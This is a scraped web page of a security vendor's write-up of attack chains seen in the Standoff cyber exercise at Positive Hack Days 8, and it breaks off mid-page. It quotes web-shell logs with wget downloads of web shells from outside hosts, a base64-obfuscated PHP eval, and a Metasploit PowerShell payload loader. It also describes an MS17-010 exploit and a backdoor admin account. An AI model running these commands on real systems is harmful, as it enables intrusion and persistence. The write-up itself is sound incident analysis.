<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚ÄúConfrontation‚Äù at Positive Hack Days 8: parsing chains of attacks</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="So, the next ‚Äúconfrontation‚Äù at the Positive Hack Days 8 conference ended. This time more than a hundred people took part in the fight: 12 attack team...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>‚ÄúConfrontation‚Äù at Positive Hack Days 8: parsing chains of attacks</h1><div class="post__text post__text-html js-mediator-article"> <a href="https://habr.com/company/pt/blog/418335/"><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  So, the next ‚Äúconfrontation‚Äù at the Positive Hack Days 8 conference ended. This time more than a hundred people took part in the fight: 12 attack teams, 8 defense teams and the whole city, which they were to attack and defend. <a name="habracut"></a><br><br>  This time, not only the attacking teams and defenders took part in The Standoff, three of our company's products observed everything that happened in the game network: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  <b><a href="https://www.ptsecurity.com/ru-ru/products/mpsiem/">MaxPatrol SIEM</a></b> - SIEM-system. </li><li>  <b><a href="https://www.ptsecurity.com/ru-ru/products/network-attack-discovery/">PT Network Attack Discovery</a></b> is a network security solution for analyzing network traffic, detecting and investigating incidents. </li><li>  <b><a href="https://www.ptsecurity.com/ru-ru/products/multiscanner/">PT MultiScanner</a></b> is a multi-level system for detecting and blocking malicious content. </li></ul><br>  The top three products were monitored by the team of Positive Technologies Security Expert Center (PT ESC), which tracks game trends and events to tell the visitors of the expert center. <br><br>  This was the first such participation of a team of experts and products and they showed themselves from the best side: there was so much data that would be enough for a huge report.  The networks of the office # 2 of the integrator company SPUTNIK and the office # 1 of the insurance company BeHealthy turned out to be the most interesting and complete according to the description.  Office No. 2 was interesting because it was under the supervision of SOC RTC, but was not taken care of by a team of defenders and the teams of the attackers completely broke it. <br><br>  Let me remind you that in addition to two offices, there were heat and power plants and substations, railway, smart houses with energy recovery and banks with ATMs in the city. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Game infrastructure</i> <br><br>  How things are happening in offices # 1 and # 2 looked through the prism of MaxPatrol SIEM, PT NAD and PT MultiScanner with an emphasis on the technical details of the hacks, will be discussed further. <br><br>  The logical scheme of the game network office # 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  The addressing of the attacking commands is 172.31.x.0 / 24, where x is the command number from 1 to 8. In fact, there were 12 teams, but due to the network architecture of the network infrastructure (the network core was emulated in Cisco CSR1000v) and the existing physical equipment, managed to organize only 8 physical network interfaces, which were connected for teams throughout the gaming zone.  Therefore, there were two teams in four networks. <br><br>  In the infrastructure of Office # 2, four network segments were allocated: <br><br><ul><li>  DMZ (100.64.154.0/25); </li><li>  servers (10.106.60.0/24); </li><li>  the company's employees (10.106.50.0/24); </li><li>  team of defenders (10.106.82.0/24). </li></ul><br>  Nodes located in the demilitarized zone were accessible over the network to all attackers.  When accessing these nodes, the real network addresses of the teams were NATed from the pool 100.110.255.0/24, so for the defenders it was not easy to figure out who the network traffic belongs to - it could be one of the 12 attacking teams or a legitimate script checker tested the performance of services from the same address pool as the attackers. <br><br>  To fill our products with events about the gaming infrastructure, we organized the removal and redirection of a copy of all network traffic in PT NAD, and also set up an extended audit of the events of the target systems and organized their delivery to MaxPatrol SIEM. <br><br>  With the analysis of attacks with an emphasis on teams can be found in our other <a href="https://habr.com/company/pt/blog/417927/">report on Habr√©</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  One of the servers in DMZ office # 2 was a server with a Joomla CMS.  A few hours after the start of the game, the first signs of compromising this server appeared in PT NAD - the webshell upload from the pool of ‚Äúgray‚Äù ip addresses: <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  As mentioned, all the subnets of the attacking teams were terminated on one ME (Attacker-FW) and when creating a connection to the attacked objects, the IP addresses of the attackers were translated into ‚Äúgray‚Äù IP addresses from a single pool (100.110.255.0/24).  Therefore, for the personification of attacks by commands, a scheme was implemented with the enrichment of interconnections on the NAT table of this ME.  Within MP SIEM, enrichment was as follows: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  This approach made it possible to determine that this attack was initiated by the command # 1.  However, due to the use of the same address pool by different teams, we cannot reliably determine the name of the team upon request from a particular network, and for the sake of further narration, we will call the teams by their network numbers. <br><br>  An hour after the attempts of team # 1, PT NAD notices the download by command # 8 to another web shell with the saying name SHE __. Php, whether it was a result of server hacking or simple scanning, it wasn‚Äôt possible to reliably establish, but after a few minutes from commands set ssh session from unprivileged user user. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  The password for this account was at the top of the rockyou dictionary and was picked up.  Access to the root account of the 8th team appeared only at about 16:00 due to user membership in the group with the right to launch commands from the root without password.  We can verify this in the MP SIEM logs, which tell about the login first under the user user, and then the privilege escalation with the sudo command. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  The time in the logs may vary by 3 hours due to the configuration of the game servers. <br><br>  By the evening of the first day of confrontation, Joomla and the sixth team took possession.  NAD discovered the exploitation of the vulnerability, or rather, the <a href="https://github.com/rootphantomer/hack_tools_for_me/blob/master/Joomla-Shell-Upload.py">features</a> through which the team flooded the well-known WSO web shell and began to interact with it. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs pgsql"><span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] POST /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] POST /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] POST /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] POST /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span><span class="hljs-number"><span class="hljs-number">.255</span></span><span class="hljs-number"><span class="hljs-number">.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> <span class="hljs-number"><span class="hljs-number">-0700</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /templates/beez3/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php HTTP</code> </pre> <br>  It's worth noting that the script that the commands used to fill the shells, <br>  requires an administrator account, the password of which was picked up using another CVE-2017-14596 vulnerability in the authentication mechanism in Joomla via LDAP: by changing the authentication LDAP request, the attackers quickly select the login and password from the administrator account. <br><br>  And after half an hour, they took over the entire system. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  The attacking team used the captured machine for further reconnaissance on the network of the second SPUTNIK office using the nmap and hping3 utilities.  We can get an idea of ‚Äã‚Äãtheir actions from MP SIEM data: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  An example of a DMZ network intelligence office 2 (100.64.154.0/24) and a network of defense teams (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  At 21:17 we discovered that the OpenVPN client was installed and running on the Joomla server.  The connection was established with the server 195.16.61.229, located in Moscow.  A little later, we found out that these actions were carried out by team members # 6, and thus the team managed to attract additional computing and human resources located at a remote site. <br><br>  All interaction with the remote site was carried out inside a protected tunnel, therefore, it is impossible to establish the nature of this interaction and the degree of its influence on the game.  We can only draw indirect conclusions based on the number of VPN sessions and the amount of transferred data. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  But the most interesting thing is that the team didn‚Äôt clean up the traces - after the game we found on the ovpn server a config containing the root and personal certificates, the private key and the personal data of the key holder.  If you use a search engine, it is not at all difficult to determine the real identity of the owner under the nickname phonexicum.  A complete map with all VPN connections during the game can be explored at the end of the article. <br><br>  Other interesting events began to develop after midnight (+3 hours to the logs). <br>  Shell /id.php of command # 4 is found by command # 1: <br><br><pre> <code class="hljs objectivec">[<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>.php?cmd=ls+-la HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  And immediately strengthened in the system, saving the web store WSO under the name 123.php <br><br><pre> <code class="hljs objectivec">[<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>.php?cmd=wget -h HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /<span class="hljs-keyword"><span class="hljs-keyword">id</span></span>.php?cmd=wget http:<span class="hljs-comment"><span class="hljs-comment">//txt.731my.com/wso.txt -o 123.php HTTP/1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  The first team managed until team # 4 discovered this in a few hours and, after a brief discussion, renames the shell id.php to 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs dos">[<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] "GET /id.php?<span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>=id HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">26</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] "GET /id.php?<span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>=ls HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] "GET /id.php?<span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>=mv id.php <span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php HTTP/<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre><br>  Later 021371b392f0b42398630fd668adff5d.php was replaced by kekekeke.php and kekpek.php <br><br><pre> <code class="hljs pgsql">[<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo "&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;" &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span><span class="hljs-number"><span class="hljs-number">.190</span></span><span class="hljs-number"><span class="hljs-number">.162</span></span>/kek.php -O kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs pgsql">[<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo "&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;" &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span><span class="hljs-number"><span class="hljs-number">.190</span></span><span class="hljs-number"><span class="hljs-number">.162</span></span>/kek.php -O kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> "&gt; Kekekeke.php HTTP <code class="hljs pgsql">[<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo "&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;" &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/May/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span><span class="hljs-number"><span class="hljs-number">.190</span></span><span class="hljs-number"><span class="hljs-number">.162</span></span>/kek.php -O kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  The following events in the domain infrastructure of the # 2 SPUTNIK office are closely related to what is happening at Joomla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  After Joomla was broken through, the attackers gained access to the internal segments of the SPUTNIK infrastructure (Office # 2).  Without thinking twice, an MS17-010 exploit arrives at the domain controller WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  The chronology of further events is more convenient to observe by the MP SIEM trigger: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  The first step of the attacker was to create a user with the name ‚Äúusername‚Äù and password ‚Äú1qazzaq!‚Äù And add it to the local administrators group (screen # 2).  Successful exploitation of exploits from MS17-010 gives access with NT-Authority \ System privileges and in Windows logs such access is displayed as win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  On behalf of the new user creates a pair of services that run a certain powershell script: <br><br><pre> <code class="hljs ruby">%COMSPEC% <span class="hljs-regexp"><span class="hljs-regexp">/b /c</span></span> start /b /min powershell.exe -nop -w hidden -noni -c <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([IntPtr]<span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-symbol"><span class="hljs-symbol">:Size</span></span> -eq <span class="hljs-number"><span class="hljs-number">4</span></span>){$b=$env<span class="hljs-symbol"><span class="hljs-symbol">:windir+</span><span class="hljs-string"><span class="hljs-symbol"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span></span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{$b=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]<span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-symbol"><span class="hljs-symbol">:Start</span></span>($s);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  This script was generated by the Metasploit framework.  Its purpose is to open a socket on port 55443 for listening and to launch the ‚Äúpayload‚Äù that came to this port - presumably Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  An attempt to launch a remote shell was successful.  After that, the attackers continued to develop the attack and username creates another account named ‚Äúvitalik‚Äù, adding this account to the ‚ÄúDomain Admins‚Äù group and shortly after its creation, we see an interactive entry. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  While vitalik created a service with the same powershell script as the username, username massively reset domain account passwords and began to be interested in the neighboring Win2008R2-EXCH mail server. <br><br>  The almost simultaneous activity of the users username and vitalik on the Exchange server of the domain (scan and login) indicates that most likely the SPUTNIK network was investigated by several team members at the same time. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img 